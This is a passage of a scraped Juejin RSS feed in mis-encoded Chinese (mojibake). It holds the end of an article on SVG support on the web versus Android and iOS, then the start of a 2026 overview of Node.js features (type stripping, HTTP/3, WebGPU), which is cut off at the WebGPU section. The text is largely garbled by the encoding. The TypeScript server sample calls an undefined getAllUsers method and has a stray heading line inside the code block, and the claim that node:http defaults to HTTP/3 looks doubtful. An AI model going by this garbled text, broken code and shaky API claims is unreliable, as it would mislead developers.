<li><strong>ä¸€ç­‰å…¬æ°‘</strong>ï¼šSVG æœ¬è´¨ä¸Šæ˜¯ XML æ–‡æœ¬ã€‚å®ƒå±äºÂ <strong>DOM æ ‘</strong>çš„ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥å’ŒÂ <code>&lt;div&gt;</code>,Â <code>&lt;p&gt;</code>ç­‰ HTML å…ƒç´ å¹¶åˆ—å­˜åœ¨ã€‚</li>
<li><strong>å…¨èƒ½å¼•æ“</strong>ï¼šæµè§ˆå™¨å†…ç½®äº†æå…¶å¼ºå¤§çš„æ¸²æŸ“å¼•æ“ï¼ˆWebCore/Blink/Geckoï¼‰ï¼Œèƒ½å¤Ÿç›´æ¥è§£æ SVG çš„æ‰€æœ‰æ ‡ç­¾ã€å±æ€§ï¼Œç”šè‡³æ”¯æŒåœ¨ SVG å†…éƒ¨åµŒå…¥ CSS æ ·å¼å’Œ JS è„šæœ¬ã€‚</li>
</ul>
<h4 data-id="heading-4">ç§»åŠ¨ç«¯ (Native)</h4>
<ul>
<li><strong>ä½å›¾ä¼˜å…ˆ</strong>ï¼šåŸç”Ÿç³»ç»Ÿæ›´æ“…é•¿å¤„ç†ä½å›¾ï¼ˆBitmap/PNG/JPGï¼‰å’Œåº•å±‚çš„å›¾å½¢ç»˜åˆ¶æŒ‡ä»¤ï¼ˆå¦‚ Android çš„ Canvas/Skiaï¼ŒiOS çš„ CoreGraphics/Metalï¼‰ã€‚</li>
<li><strong>æ— å†…ç½®è§£æå™¨</strong>ï¼šåŸç”Ÿç³»ç»Ÿæ²¡æœ‰å†…ç½®ä¸€ä¸ªå®Œæ•´çš„â€œXML è§£æ+æ¸²æŸ“å¼•æ“â€æ¥ä¸“é—¨æœåŠ¡äº UI å›¾æ ‡ã€‚</li>
</ul>
<h3 data-id="heading-5">2. æ ‡å‡†ä¹‹é‡ï¼šSVG çš„å¤æ‚æ€§ vs ç§»åŠ¨ç«¯çš„æ€§èƒ½</h3>
<p>è¿™æ˜¯æœ€æ ¸å¿ƒçš„åŸå› ã€‚SVG æ ‡å‡†ï¼ˆW3C åˆ¶å®šï¼‰éå¸¸åºå¤§ï¼Œå®ƒä¸ä»…ä»…æ˜¯ç”»å‡ æ¡çº¿ï¼Œå®ƒè¿˜æ”¯æŒï¼š</p>
<ul>
<li>âŒ å¤æ‚çš„æ»¤é•œï¼ˆé«˜æ–¯æ¨¡ç³Šã€å…‰ç…§æ•ˆæœç­‰ï¼‰</li>
<li>âŒ æ¸å˜ï¼ˆçº¿æ€§ã€å¾„å‘ã€ç½‘æ ¼ï¼‰</li>
<li>âŒ åŠ¨ç”»ï¼ˆSMILï¼‰</li>
<li>âŒ äº¤äº’ï¼ˆåµŒå…¥ JavaScriptï¼‰</li>
<li>âŒ å¤–éƒ¨èµ„æºï¼ˆå­—ä½“å¼•å…¥ï¼‰</li>
</ul>
<h4 data-id="heading-6">ç§»åŠ¨ç«¯çš„ç—›ç‚¹ï¼š</h4>
<p>è¦åœ¨ç§»åŠ¨ç«¯åŸç”Ÿå®ç°ä¸€ä¸ªæ”¯æŒå®Œæ•´ SVG æ ‡å‡†çš„è§£æå™¨ï¼Œç›¸å½“äºåœ¨ App é‡Œå¡è¿›åŠä¸ªæµè§ˆå™¨å†…æ ¸ã€‚è¿™ä¼šå¯¼è‡´ï¼š</p>
<ul>
<li><strong>åŒ…ä½“ç§¯å‰§å¢</strong>ï¼šä¸ºäº†æ˜¾ç¤ºå‡ ä¸ªå›¾æ ‡å¼•å…¥å‡ å…†çš„æ¸²æŸ“åº“æ˜¯ä¸åˆ’ç®—çš„ã€‚</li>
<li><strong>æ€§èƒ½å¼€é”€å¤§</strong>ï¼šSVG æ˜¯æ–‡æœ¬æ ¼å¼ï¼Œè¿è¡Œæ—¶è§£æ XML éå¸¸æ¶ˆè€— CPUã€‚å¦‚æœåœ¨ä¸€ä¸ªé•¿åˆ—è¡¨ï¼ˆListView/RecyclerViewï¼‰é‡Œæ¯ä¸€è¡Œéƒ½å®æ—¶è§£æ SVGï¼Œæ»‘åŠ¨ä¼šéå¸¸å¡é¡¿ã€‚</li>
</ul>
<h3 data-id="heading-7">3. å„å¹³å°çš„â€œå¦¥åâ€æ–¹æ¡ˆ</h3>
<p>å› ä¸ºåŸç”Ÿä¸æ”¯æŒç›´æ¥æŠŠÂ <code>.svg</code>æ–‡ä»¶æ‰”è¿›å»å½“å›¾ç‰‡ç”¨ï¼ˆå°¤å…¶åœ¨æ—©æœŸç‰ˆæœ¬ï¼‰ï¼Œå„å¹³å°é‡‡ç”¨äº†â€œé˜‰å‰²â€æˆ–â€œè½¬è¯‘â€çš„ç­–ç•¥ï¼š</p>
<h4 data-id="heading-8">ğŸ¤– Android çš„åšæ³•ï¼šVectorDrawable</h4>
<ul>
<li><strong>åŸç†</strong>ï¼šAndroid Studio æä¾›å·¥å…·å°† SVG è½¬è¯‘æˆ Android èƒ½è¯»æ‡‚çš„ XML æ ¼å¼ã€‚</li>
<li><strong>é™åˆ¶</strong>ï¼šVectorDrawable åªæ”¯æŒ SVG çš„ä¸€ä¸ªå­é›†ï¼ˆä¸»è¦æ˜¯ Path è·¯å¾„ã€ç®€å•çš„é¢œè‰²ï¼‰ã€‚å¦‚æœ SVG é‡Œæœ‰å¤æ‚çš„é˜´å½±æˆ–æ»¤é•œï¼Œè½¬æ¢ä¼šå¤±è´¥ã€‚</li>
<li><strong>ä¼˜åŒ–</strong>ï¼šè¿™äº› XML åœ¨ç¼–è¯‘æ—¶ä¼šè¢«å¤„ç†æˆäºŒè¿›åˆ¶æ•°æ®ï¼Œè§£æé€Ÿåº¦è¿œå¿«äºåŸå§‹ SVGã€‚</li>
</ul>
<h4 data-id="heading-9">ğŸ iOS çš„åšæ³•ï¼šPDF / Asset Catalogs</h4>
<ul>
<li><strong>æ—©æœŸ</strong>ï¼šiOS å¼€å‘è€…ä¹ æƒ¯ä½¿ç”¨ PDF çŸ¢é‡å›¾ï¼ˆå› ä¸º PDF æ˜¯è‹¹æœç³»ç»Ÿçš„æ ¸å¿ƒæ ¼å¼ï¼‰ã€‚</li>
<li><strong>ç°åœ¨ (Xcode 12+)</strong> ï¼šiOS ç»ˆäºæ”¯æŒç›´æ¥å¯¼å…¥ SVG äº†ã€‚</li>
<li><strong>çœŸç›¸</strong>ï¼šiOS çš„ SVG æ”¯æŒé€šå¸¸æ˜¯åœ¨ç¼–è¯‘é˜¶æ®µå°†å…¶å¤„ç†ï¼ˆRasterizeï¼‰æˆ PNG ä»¥å…¼å®¹ä½ç‰ˆæœ¬ï¼Œæˆ–è€…ä¿ç•™ä¸ºçŸ¢é‡æ•°æ®ã€‚ä½†åœ¨è¿è¡Œæ—¶ï¼Œå®ƒä¸»è¦è¢«è§†ä¸ºé™æ€å›¾åƒï¼Œä¸åƒ Web é‚£æ ·å¯ä»¥ç”¨ CSS éšæ„ä¿®æ”¹å®ƒçš„å†…éƒ¨èŠ‚ç‚¹ã€‚</li>
</ul>
<h3 data-id="heading-10">4. å…¨æ–¹ä½å¯¹æ¯”</h3>






























<table><thead><tr><th>ç‰¹æ€§</th><th>Web å‰ç«¯</th><th>Android/iOS å®¢æˆ·ç«¯</th></tr></thead><tbody><tr><td><strong>åŠ è½½æ–¹å¼</strong>â€‹</td><td>ç›´æ¥Â <code>&lt;svg&gt;</code>æˆ–Â <code>&lt;img&gt;</code></td><td>éœ€è¦è½¬æ¢æ ¼å¼ (xml/pdf) æˆ–ç‰¹å®šè®¾ç½®</td></tr><tr><td><strong>è§£æèƒ½åŠ›</strong>â€‹</td><td>å…¨åŠŸèƒ½æ”¯æŒ (æ»¤é•œã€åŠ¨ç”»ã€è„šæœ¬)</td><td>ä»…æ”¯æŒå­é›† (ä¸»è¦æ˜¯è·¯å¾„ Path)</td></tr><tr><td><strong>æ€§èƒ½ç“¶é¢ˆ</strong>â€‹</td><td>æµè§ˆå™¨å†…æ ¸å¼ºå¤§ï¼Œè‡ªå¸¦ç¡¬ä»¶åŠ é€Ÿ</td><td>XML è§£æè€— CPUï¼Œéœ€è½¬äºŒè¿›åˆ¶ä¼˜åŒ–</td></tr><tr><td><strong>åŠ¨æ€æ€§</strong>â€‹</td><td>å¯é€šè¿‡ CSS/JS ä¿®æ”¹ä»»æ„ç»†èŠ‚</td><td>ä¿®æ”¹å›°éš¾ï¼Œé€šå¸¸åªèƒ½æ•´ä½“ç€è‰² (Tint)</td></tr></tbody></table>
<h3 data-id="heading-11">5. ç°åœ¨çš„æœ€ä½³å®è·µæ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>å¦‚æœä½ éœ€è¦åœ¨ç§»åŠ¨ç«¯ä½¿ç”¨çŸ¢é‡å›¾ï¼Œç›®å‰é€šå¸¸æœ‰ä»¥ä¸‹å‡ ç§æ ‡å‡†æ–¹æ¡ˆï¼š</p>
<h4 data-id="heading-12">å›¾æ ‡/ç®€å•å›¾å½¢</h4>
<ul>
<li><strong>Android</strong>: ä½¿ç”¨ Android Studio è‡ªå¸¦å·¥å…·è½¬ä¸º VectorDrawable (.xml)ã€‚</li>
<li><strong>iOS</strong>: ç›´æ¥æ”¾å…¥ Xcode Assetsï¼Œå‹¾é€‰ "Preserve Vector Data" å’Œ "Single Scale"ã€‚</li>
</ul>
<h4 data-id="heading-13">å¤æ‚çš„çŸ¢é‡æ’ç”»/åŠ¨ç”»</h4>
<ul>
<li>ğŸš€Â <strong>Lottie (Airbnb å¼€æº)</strong> ï¼šè¿™æ˜¯ç›®å‰çš„è¡Œä¸šæ ‡å‡†ã€‚è®¾è®¡å¸ˆç”¨ After Effects å¯¼å‡º JSONï¼ŒLottie åº“åœ¨ç§»åŠ¨ç«¯æå…¶é«˜æ•ˆåœ°æ¸²æŸ“å‡ºæ¥ï¼Œé¿å¼€äº† SVG è§£æçš„æ€§èƒ½å‘ã€‚</li>
</ul>
<h4 data-id="heading-14">å¿…é¡»æ˜¾ç¤ºåŸå§‹ SVG</h4>
<ul>
<li>å¼•å…¥ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚Â <code>android-svg</code>æˆ–Â <code>SVGKit</code>ï¼‰ï¼Œä»£ä»·æ˜¯å¢åŠ åŒ…ä½“ç§¯ã€‚</li>
<li>ä½¿ç”¨ WebView åŠ è½½ï¼ˆæ€é¸¡ç”¨ç‰›åˆ€ï¼Œä½†å…¼å®¹æ€§æœ€å¥½ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-15">æ€»ç»“</h3>
<p>ç§»åŠ¨ç«¯â€œæ— æ³•åŠ è½½â€SVGï¼Œæœ¬è´¨ä¸Šæ˜¯åœ¨<strong>æ€§èƒ½</strong>å’Œ<strong>åŠŸèƒ½</strong>ä¹‹é—´åšçš„å–èˆã€‚ç§»åŠ¨ç«¯åŸç”Ÿç³»ç»Ÿä¸ºäº†è¿½æ±‚æè‡´çš„ UI æµç•…åº¦å’Œä½åŠŸè€—ï¼Œé€‰æ‹©æ”¾å¼ƒäº†åºå¤§ä¸”å¤æ‚çš„ SVG æ ‡å‡†æ”¯æŒï¼Œè½¬è€Œä½¿ç”¨æ›´ç²¾ç®€çš„çŸ¢é‡æ–¹æ¡ˆã€‚è€Œ Web æµè§ˆå™¨ï¼Œä»å…¶è¯ç”Ÿä¹‹åˆå°±ä¸ºè§£æå’Œæ¸²æŸ“è¿™ç±»ç»“æ„åŒ–æ ‡è®°è¯­è¨€è€Œç”Ÿï¼Œå› æ­¤æˆä¸ºäº† SVG æœ€å®Œç¾çš„å®¿ä¸»ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 å¹´çš„ Node.js å·²ç»ä¸æ˜¯é‚£ä¸ªä½ è®¤è¯†çš„ Node.js äº†]]></title>    <link>https://juejin.cn/post/7602454700503597097</link>    <guid>https://juejin.cn/post/7602454700503597097</guid>    <pubDate>2026-02-03T12:22:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602454700503597097" data-draft-id="7602420156397355051" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 å¹´çš„ Node.js å·²ç»ä¸æ˜¯é‚£ä¸ªä½ è®¤è¯†çš„ Node.js äº†"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-02-03T12:22:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†´ç¾½"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 å¹´çš„ Node.js å·²ç»ä¸æ˜¯é‚£ä¸ªä½ è®¤è¯†çš„ Node.js äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†´ç¾½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:22:24.000Z" title="Tue Feb 03 2026 12:22:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2026 å¹´çš„ Node.js å·²ç»ä¸æ˜¯é‚£ä¸ªä½ è®¤è¯†çš„ Node.js äº†ã€‚</p>
<p>è¿‡å»éœ€è¦å‡ åä¸ªä¾èµ–é¡¹å’Œå¤æ‚é…ç½®æ‰èƒ½å®ç°çš„åŠŸèƒ½ï¼Œç°åœ¨éƒ½å¯ä»¥å¼€ç®±å³ç”¨ã€‚</p>
<p>åŸç”Ÿçš„ TypeScript æ”¯æŒã€å†…ç½®çš„ AI èƒ½åŠ›ã€é»˜è®¤ HTTP/3 åè®®ï¼Œä»¥åŠçœŸæ­£æœ‰æ•ˆçš„æƒé™æ¨¡å‹ï¼Œè¿™äº›éƒ½å·²ç»å°† Node.js ä»ä¸€ä¸ªè¿è¡Œæ—¶ç¯å¢ƒè½¬å˜æˆä¸€ä¸ªå®Œæ•´çš„å¹³å°ã€‚</p>
<p>å¦‚æœä½ æœ€è¿‘æ²¡æœ‰ä½¿ç”¨è¿‡ Node.jsï¼Œé‚£ä½ å¾ˆæœ‰å¯èƒ½é”™è¿‡äº†è¿™äº›åŠŸèƒ½ã€‚</p>
<p>æœ¬ç¯‡è®©æˆ‘ä»¬æ·±å…¥æ¢è®¨è¿™äº›å·²ç»å‘ç”Ÿçš„å˜åŒ–ä»¥åŠå®ƒä»¬çš„é‡è¦æ€§ã€‚</p>
<h2 data-id="heading-0">1. åŸç”Ÿ TypeScript ç±»å‹å‰¥ç¦»ï¼šæ¸¸æˆè§„åˆ™æ”¹å˜è€…</h2>
<p>Node.js æœ€å…·å˜é©æ€§çš„æ–°å¢åŠŸèƒ½æ˜¯<strong>é€šè¿‡ç±»å‹å‰¥ç¦»å®ç°çš„åŸç”Ÿ TypeScript æ”¯æŒ</strong>ã€‚</p>
<p>ä¸å†éœ€è¦ <code>ts-node</code>ã€<code>tsx</code> æˆ–å¤æ‚çš„æ„å»ºé…ç½®ï¼Œä½ åªéœ€è¦ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">node --experimental-strip-types app.ts
</code></pre>
<p>å°±æ˜¯è¿™æ ·ï¼Œä¸€ä¸ªå‚æ•°ï¼Œä½ å°±å¯ä»¥ç›´æ¥åœ¨ Node.js ä¸­è¿è¡Œ TypeScriptã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// server.ts - ä½¿ç”¨ç±»å‹å‰¥ç¦»ç›´æ¥è¿è¡Œ</span>
<span class="hljs-keyword">import</span> { createServer } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:http"</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>;
}
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDatabase</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">users</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">number</span>, <span class="hljs-title class_">User</span>&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

  <span class="hljs-title function_">addUser</span>(<span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">users</span>.<span class="hljs-title function_">set</span>(user.<span class="hljs-property">id</span>, user);
  }

  <span class="hljs-title function_">getUser</span>(<span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>): <span class="hljs-title class_">User</span> | <span class="hljs-literal">undefined</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">users</span>.<span class="hljs-title function_">get</span>(id);
  }
}
<span class="hljs-keyword">const</span> db = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDatabase</span>();
<span class="hljs-keyword">const</span> server = <span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, { <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span> });
  res.<span class="hljs-title function_">end</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(db.<span class="hljs-title function_">getAllUsers</span>()));
});
server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
ç±»å‹å‰¥ç¦»çš„å·¥ä½œåŸç†;
</code></pre>
<p>ä¸ä¼ ç»Ÿ TypeScript ç¼–è¯‘ä¸åŒï¼Œç±»å‹å‰¥ç¦»éå¸¸ä¼˜é›…å’Œç®€å•ï¼š</p>
<ol>
<li>
<p><strong>è§£æ</strong> TypeScript æ–‡ä»¶</p>
</li>
<li>
<p><strong>ç§»é™¤</strong> ç±»å‹æ³¨è§£ã€æ¥å£å’Œä»…ç”¨äºç±»å‹çš„æ„é€ </p>
</li>
<li>
<p><strong>æ‰§è¡Œ</strong> ç”Ÿæˆçš„ JavaScript</p>
</li>
</ol>
<p>è¿™ä½¿å¾—ç±»å‹å‰¥ç¦» <strong>æ¯”å®Œæ•´ TypeScript ç¼–è¯‘å¿« 10-20 å€</strong>ï¼Œå› ä¸ºæ²¡æœ‰ç±»å‹æ£€æŸ¥ã€æ²¡æœ‰è½¬æ¢â€”â€”åªæ˜¯ç§»é™¤ç±»å‹è¯­æ³•ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ æ—§æ–¹å¼ - éœ€è¦è½¬æ¢</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">Status</span> {
  <span class="hljs-title class_">Active</span>,
  <span class="hljs-title class_">Inactive</span>,
}

<span class="hljs-comment">// âœ… æ–°æ–¹å¼ - æ”¯æŒç±»å‹å‰¥ç¦»</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Status</span> = { <span class="hljs-title class_">Active</span>: <span class="hljs-string">"ACTIVE"</span>, <span class="hljs-title class_">Inactive</span>: <span class="hljs-string">"INACTIVE"</span> } <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Status</span> = (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Status</span>)[keyof <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Status</span>];
</code></pre>
<p><strong>å¼€å‘æ—¶</strong>ï¼ˆå³æ—¶åˆ·æ–°ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">node --experimental-strip-types --watch server.ts
</code></pre>
<p><strong>ç”Ÿäº§æ—¶</strong>ï¼ˆå•ç‹¬ç±»å‹æ£€æŸ¥ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">tsc --noEmit  <span class="hljs-comment"># ä»…ç±»å‹æ£€æŸ¥</span>
node --experimental-strip-types server.ts
</code></pre>
<p>æ³¨æ„ï¼š<strong>ç±»å‹å‰¥ç¦»ä¸ä¼šå–ä»£ç±»å‹æ£€æŸ¥</strong>â€”â€”å®ƒåªæ˜¯åœ¨å¼€å‘è¿‡ç¨‹ä¸­æ¶ˆé™¤äº†ç¼–è¯‘ç“¶é¢ˆã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c61c7d8abd2b4c2bad6e1c381757c1b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770777700&amp;x-signature=w0jK5C9oyKPYTtAKovLuAJ%2FEyJg%3D" alt="TypeScriptæ”¯æŒ" loading="lazy"/></p>
<h2 data-id="heading-1">2. HTTP/3 &amp; QUICï¼šé»˜è®¤åŠ é€Ÿ</h2>
<p>HTTP/3 æ”¯æŒç°å·²ç¨³å®šå¹¶é»˜è®¤å¯ç”¨ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { request } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:http"</span>;

<span class="hljs-keyword">const</span> req = <span class="hljs-title function_">request</span>(<span class="hljs-string">"https://api.example.com/data"</span>, <span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Protocol:"</span>, res.<span class="hljs-property">httpVersion</span>); <span class="hljs-comment">// 3.0</span>
  res.<span class="hljs-title function_">on</span>(<span class="hljs-string">"data"</span>, <span class="hljs-function">(<span class="hljs-params">chunk</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(chunk.<span class="hljs-title function_">toString</span>()));
});
req.<span class="hljs-title function_">end</span>();
</code></pre>
<p><strong>ä½¿ç”¨å®ƒçš„ä¼˜åŠ¿åœ¨äºï¼š</strong></p>
<ul>
<li>
<p>é€Ÿåº¦æå‡ï¼šå®é™…ç¯å¢ƒä¸‹å“åº”é€Ÿåº¦æå‡ 20%â€“50%</p>
</li>
<li>
<p>è¿æ¥è¿ç§»ï¼šWiFi å’Œèœ‚çªç½‘ç»œä¹‹é—´çš„æ— ç¼åˆ‡æ¢</p>
</li>
<li>
<p>æ— é˜Ÿå¤´é˜»å¡ï¼šæ¯” HTTP/2 å…·æœ‰æ›´å¥½çš„å¤šè·¯å¤ç”¨æ€§èƒ½</p>
</li>
<li>
<p>å†…ç½®åŠ å¯†ï¼šQUIC å¼ºåˆ¶ä½¿ç”¨ TLS 1.3ã€‚</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85ac42499f7e4becbcda8bd9b9a5f0d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770777700&amp;x-signature=ZfxYbDAZmox3SvLB4TCGD%2BwU5z0%3D" alt="HTTP/3åŠ é€Ÿ" loading="lazy"/></p>
<h2 data-id="heading-2">3. åŸç”Ÿ WebGPU ç”¨äº AI/ML å·¥ä½œè´Ÿè½½</h2>
<p>WebGPU API æ”¯æŒåœ¨ Node.js ä¸­ç›´æ¥è¿›è¡Œ GPU åŠ é€Ÿè®¡ç®—ã€‚</p>
